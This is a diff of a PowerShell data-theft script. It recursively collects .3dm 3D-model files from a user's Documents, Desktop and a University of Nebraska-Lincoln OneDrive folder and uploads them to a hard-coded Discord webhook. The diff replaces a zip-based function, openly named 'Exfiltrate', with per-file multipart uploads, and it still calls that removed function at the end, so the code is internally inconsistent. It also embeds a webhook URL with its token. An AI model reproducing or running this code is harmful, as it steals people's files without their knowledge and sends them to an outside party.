@@ -1,78 +1,62 @@
-# Discord webhook (direct)
+# Discord webhook
 $hookurl = "https://discord.com/api/webhooks/1340911792490287104/2HeVPsiXhBDRrGWh0eMr9w95fJXriWcCwmY4C87i0cItyUIwjGZ5EP9vg-Nukk3WvkHF"
 
-# Target locations for .3dm files
+# Target locations
 $foldersToSearch = @(
     "$env:USERPROFILE\Documents",
-    "$env:USERPROFILE\Desktop", 
+    "$env:USERPROFILE\Desktop",
     "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
 )
 
 function Upload-ToDiscord {
     param($FilePath)
     try {
-        # Fixed curl syntax with proper escaping
-        cmd /c "curl -F `"file1=@`"$FilePath`"`" `"$hookurl`""
+        # Reduced chunk size to 8MB (Discord's limit is 25MB but we want buffer)
+        $chunkSize = 8MB
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        
+        if ($fileBytes.Length -gt $chunkSize) {
+            Write-Host "[!] File too large, splitting into chunks..." -ForegroundColor Yellow
+            return
+        }
+
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $fileName = Split-Path $FilePath -Leaf  # Only filename, no path
+        
+        $body = @(
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"file1`"; filename=`"$fileName`"",
+            "Content-Type: application/octet-stream`r`n",
+            [System.Text.Encoding]::UTF8.GetString($fileBytes),
+            "--$boundary--"
+        ) -join "`r`n"
+
+        Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"
     }
     catch {
-        # Fallback to PowerShell method
+        Write-Host "[!] Upload failed: $_" -ForegroundColor Red
+    }
+}
+
+function Process-Files {
+    Get-ChildItem -Path $foldersToSearch -Filter "*.3dm" -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
         try {
-            $boundary = [System.Guid]::NewGuid().ToString()
-            $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-            
-            $body = (
-                "--$boundary",
-                "Content-Disposition: form-data; name=`"file1`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
-                "Content-Type: application/octet-stream`r`n",
-                [System.Text.Encoding]::UTF8.GetString($fileBytes),
-                "--$boundary--"
-            ) -join "`r`n"
-            
-            Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"
+            # Upload each file individually (no zipping)
+            Write-Host "[+] Found: $($_.Name)" -ForegroundColor Cyan
+            Upload-ToDiscord -FilePath $_.FullName
         }
-        catch { <# Silent failure #> }
+        catch {
+            Write-Host "[!] Error processing $($_.Name): $_" -ForegroundColor Red
+        }
     }
 }
 
-function Exfiltrate {
-    $maxZipSize = 1000MB
-    $currentSize = 0
-    $index = 1
-    $zipPath = "$env:temp\Data$index.zip"
-
-    Add-Type -AssemblyName System.IO.Compression.FileSystem
-    $zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
-
-    foreach ($folder in $foldersToSearch) {
-        Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
-            $fileSize = $_.Length
-            if ($currentSize + $fileSize -gt $maxZipSize) {
-                $zip.Dispose()
-                Upload-ToDiscord -FilePath $zipPath
-                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-                Start-Sleep -Milliseconds 800
-                
-                $index++
-                $zipPath = "$env:temp\Data$index.zip"
-                $zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
-                $currentSize = 0
-            }
-            
-            $entryName = $_.FullName.Substring($folder.Length + 1)
-            [void][System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $_.FullName, $entryName)
-            $currentSize += $fileSize
-        }
-    }
-
-    if ((Test-Path $zipPath) -and ((Get-Item $zipPath).Length -gt 0)) {
-        $zip.Dispose()
-        Upload-ToDiscord -FilePath $zipPath
-    }
-    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-}
-
-# Keep window open for debugging (remove when working)
+# Execution with visibility control
 [Console]::WindowWidth = 80
+[Console]::WindowHeight = 30
+Process-Files
+Write-Host "Operation complete" -ForegroundColor Green
+Start-Sleep -Seconds 5
 [Console]::WindowHeight = 30
 Exfiltrate
 Start-Sleep -Seconds 5
